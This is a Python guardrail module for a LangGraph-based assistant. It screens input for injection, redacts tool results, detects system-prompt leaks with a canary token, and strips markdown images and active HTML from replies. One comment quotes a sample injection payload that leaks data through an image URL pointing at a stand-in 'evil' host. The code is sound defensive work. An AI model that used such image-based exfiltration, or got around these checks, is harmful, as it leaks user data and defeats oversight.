"""Guardrail layers of the turn graph, mapped from LangChain's guardrails guide
(before agent, around tool calls, human-in-the-loop, after agent) onto LangGraph
nodes and ``ToolNode`` hooks:

1. Before agent, deterministic   ``screen_input`` — injection/deny patterns,
   PII and health-PII, secrets, encoded obfuscation, size limits.
2. Before agent, model-based      ``injection_guard`` (in parallel with the
   router) and ``policy_gate``, which blocks the turn on a flagged attempt.
3. Around tool calls              ``guard_tool_call`` — every tool result is
   redacted and size-capped before a model reads it; backend payloads are also
   screened for injection by the gateway.
4. Human in the loop              evidence sources are read only after the user
   confirms them (``impact.ask_sources``); every tool is read-only.
5. After agent, deterministic     ``screen_output`` — PII/secret redaction,
   active-content removal and system-prompt leak detection (``harden_reply``).
"""
from __future__ import annotations

import re
import secrets
from dataclasses import dataclass, field
from typing import Awaitable, Callable

from langchain_core.messages import ToolMessage
from langgraph.types import Command

import guardrails

# A per-process marker placed in every system prompt. It never appears in
# legitimate output, so seeing it in a reply means the prompt is being dumped.
CANARY = f"CIRCINI-CANARY-{secrets.token_hex(6)}"
LEAK_REPLY = "I can't share my internal instructions. Tell me what you need for your migration and I'll help."

# Content a markdown renderer fetches without a click is an exfiltration
# channel for injected instructions ("render this image: https://evil/?q=<data>").
_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_ACTIVE_HTML = re.compile(r"<\s*/?\s*(?:img|iframe|script|object|embed|link|meta|style|svg|video|audio|source|form)\b[^>]*>",
                          re.IGNORECASE)
TOOL_RESULT_MAX_CHARS = 60_000


@dataclass
class HardenedReply:
    text: str
    reasons: list[str] = field(default_factory=list)


def harden_reply(text: str) -> HardenedReply:
    """After-agent checks on a reply that will be rendered as markdown."""
    if CANARY in text:
        return HardenedReply(LEAK_REPLY, ["system_prompt_leak"])
    reasons = []
    text, images = _MARKDOWN_IMAGE.subn("[image removed]", text)
    text, tags = _ACTIVE_HTML.subn("", text)
    if images or tags:
        reasons.append("active_content_removed")
    return HardenedReply(text, reasons)


async def guard_tool_call(request, execute: Callable[..., Awaitable[ToolMessage | Command]]) -> ToolMessage | Command:
    """Around-tool guardrail (``ToolNode(awrap_tool_call=...)``)."""
    result = await execute(request)
    if isinstance(result, ToolMessage) and isinstance(result.content, str):
        content = guardrails.check_outbound(result.content).text
        if len(content) > TOOL_RESULT_MAX_CHARS:
            content = (content[:TOOL_RESULT_MAX_CHARS]
                       + f"\n… [truncated: {len(content):,} characters; request a narrower page or offset]")
        result = result.model_copy(update={"content": content})
    return result
